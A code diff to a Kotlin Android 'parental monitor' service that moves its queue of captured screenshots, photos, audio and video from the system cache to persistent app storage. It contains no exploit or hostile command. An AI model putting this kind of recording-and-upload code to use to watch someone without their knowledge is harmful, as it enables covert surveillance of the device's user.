@@ -4285,7 +4285,7 @@ class MonitoringService : Service() {
         var count = 0
         var bytes = 0L
         try {
-            cacheDir.listFiles()?.forEach { file ->
+            antreMedia().listFiles()?.forEach { file ->
                 if (!file.isFile || isMediaActive(file)) return@forEach
                 val name = file.name
                 val photo = wantsPhoto && (name.startsWith("camera_") || name.startsWith("screenshot_")) && (name.endsWith(".jpg") || name.endsWith(".tmp"))
@@ -8175,7 +8175,7 @@ class MonitoringService : Service() {
 
     private fun pendingMediaCount(): Int {
         return try {
-            cacheDir.listFiles { file ->
+            antreMedia().listFiles { file ->
                 file.isFile && file.length() > 0L && (
                     (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") ||
                         file.name.startsWith("video_") && file.name.endsWith(".mp4") ||
@@ -10527,7 +10527,7 @@ class MonitoringService : Service() {
         var heldEntries = heldPhotoEntriesNow()
         if (heldEntries.isNotEmpty()) {
             val files = try {
-                cacheDir.listFiles { file ->
+                antreMedia().listFiles { file ->
                     file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
                 }
             } catch (_: Exception) {
@@ -11067,8 +11067,8 @@ class MonitoringService : Service() {
     }
 
     private fun writeScreenshotJpeg(bmp: Bitmap): File? {
-        val out = File(cacheDir, "screenshot_" + TimeFmt.fileStamp(System.currentTimeMillis()) + "_" + java.util.UUID.randomUUID() + ".jpg")
-        val tmp = File(cacheDir, out.name + ".tmp")
+        val out = File(antreMedia(), "screenshot_" + TimeFmt.fileStamp(System.currentTimeMillis()) + "_" + java.util.UUID.randomUUID() + ".jpg")
+        val tmp = File(antreMedia(), out.name + ".tmp")
         return try {
             val compressed = java.io.FileOutputStream(tmp).use { bmp.compress(Bitmap.CompressFormat.JPEG, 85, it) }
             if (!compressed || !tmp.exists() || tmp.length() == 0L) {
@@ -11760,7 +11760,7 @@ class MonitoringService : Service() {
 
     private fun pendingVideoCount(): Int {
         return try {
-            cacheDir.listFiles { file ->
+            antreMedia().listFiles { file ->
                 file.isFile && file.length() > 0L && file.name.startsWith("video_") && file.name.endsWith(".mp4") && !isMediaActive(file)
             }?.size ?: 0
         } catch (_: Exception) {
@@ -11770,7 +11770,7 @@ class MonitoringService : Service() {
 
     private fun pendingPhotoCount(): Int {
         return try {
-            cacheDir.listFiles { file ->
+            antreMedia().listFiles { file ->
                 file.isFile && file.length() > 0L && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && !isMediaActive(file)
             }?.size ?: 0
         } catch (_: Exception) {
@@ -11780,7 +11780,7 @@ class MonitoringService : Service() {
 
     private fun pendingAudioCount(): Int {
         return try {
-            cacheDir.listFiles { file ->
+            antreMedia().listFiles { file ->
                 file.isFile && file.length() > 0L && file.name.startsWith("audio_") && file.name.endsWith(".m4a") && !isMediaActive(file)
             }?.size ?: 0
         } catch (_: Exception) {
@@ -12133,8 +12133,8 @@ class MonitoringService : Service() {
         }
         ensureForegroundTypes()
         val audioLock = acquireOpWakeLock("record", seconds * 1000L + MEDIA_UPLOAD_GRACE_MS + 60_000L)
-        val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + "_" + java.util.UUID.randomUUID() + ".m4a")
-        val audioTmp = File(cacheDir, audioFile.name + ".tmp")
+        val audioFile = File(antreMedia(), "audio_" + System.currentTimeMillis() + "_" + java.util.UUID.randomUUID() + ".m4a")
+        val audioTmp = File(antreMedia(), audioFile.name + ".tmp")
         var recorder: android.media.MediaRecorder? = null
         var keepForRetry = false
         var audioOutcome: MediaSendOutcome? = null
@@ -12654,7 +12654,7 @@ class MonitoringService : Service() {
             val attempted = HashSet<String>()
             drain@ while (batches < 3) {
                 val pending = try {
-                    val all = cacheDir.listFiles { file ->
+                    val all = antreMedia().listFiles { file ->
                         file.isFile && file.name.startsWith(prefix) && file.name.endsWith(ext)
                     }?.sortedBy { it.lastModified() } ?: break@drain
                     lastFullListing = all
@@ -12746,7 +12746,7 @@ class MonitoringService : Service() {
         if (videoFlushBusy.get()) return
         try {
             try {
-                cacheDir.listFiles { file ->
+                antreMedia().listFiles { file ->
                     file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4.tmp") && System.currentTimeMillis() - file.lastModified() > 3_600_000L
                 }?.forEach { deleteQuietly(it) }
             } catch (_: Exception) {
@@ -12756,7 +12756,7 @@ class MonitoringService : Service() {
             // lastModified ditulis ulang rotasi flush,
             // sehingga berkas tua yang gagal terus tampak
             // baru dan lolos buangan.
-            val files = (known ?: cacheDir.listFiles { file ->
+            val files = (known ?: antreMedia().listFiles { file ->
                 file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
             }?.toList())
                 ?.map { file ->
@@ -12796,10 +12796,10 @@ class MonitoringService : Service() {
         if (audioFlushBusy.get()) return
         try {
             val staleTmpCutoff = System.currentTimeMillis() - 6 * 60 * 60_000L
-            cacheDir.listFiles { file ->
+            antreMedia().listFiles { file ->
                 file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".tmp") && file.lastModified() < staleTmpCutoff
             }?.forEach { deleteQuietly(it) }
-            val files = (known ?: cacheDir.listFiles { file ->
+            val files = (known ?: antreMedia().listFiles { file ->
                 file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
             }?.toList())
                 ?.map { file ->
@@ -12934,13 +12934,20 @@ class MonitoringService : Service() {
 
     private data class CacheStats(val bytes: Long, val photos: Int, val audios: Int, val videos: Int)
 
+    // Direktori antrean media (issue #1443): dulu
+    // cacheDir yang bisa dibersihkan sistem; kini
+    // filesDir/media lewat MediaDirs (dengan migrasi
+    // sekali jalan dari cacheDir lama).
+    private fun antreMedia(): java.io.File =
+        com.redeye.parentalmonitor.utils.MediaDirs.queueDir(this)
+
     private fun cacheStats(): CacheStats {
         var bytes = 0L
         var photos = 0
         var audios = 0
         var videos = 0
         try {
-            val top = try { cacheDir.listFiles() } catch (_: Exception) { null } ?: emptyArray()
+            val top = try { antreMedia().listFiles() } catch (_: Exception) { null } ?: emptyArray()
             for (file in top) {
                 try {
                     if (file.isFile) {
@@ -13051,7 +13058,7 @@ class MonitoringService : Service() {
             val attempted = HashSet<String>()
             drain@ while (batches < 3) {
                 val pending = try {
-                    val all = cacheDir.listFiles { file ->
+                    val all = antreMedia().listFiles { file ->
                         file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
                     }?.sortedBy { it.lastModified() } ?: break@drain
                     lastFullListing = all
@@ -13152,7 +13159,7 @@ class MonitoringService : Service() {
         if (photoFlushBusy.get()) return -1
         try {
             try {
-                cacheDir.listFiles { file ->
+                antreMedia().listFiles { file ->
                     file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) &&
                         file.name.endsWith(".tmp") && System.currentTimeMillis() - file.lastModified() > 3_600_000L
                 }?.forEach { deleteQuietly(it) }
@@ -13166,7 +13173,7 @@ class MonitoringService : Service() {
             // dulu. mediaNameTimeMs memang dibuat #855 untuk menilai
             // umur dari nama; nama tanpa cap terbaca jatuh ke
             // lastModified. Urutan flush sendiri tidak diubah.
-            val photos = (known ?: cacheDir.listFiles { file ->
+            val photos = (known ?: antreMedia().listFiles { file ->
                 file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
             }?.toList())
                 ?.map { file ->
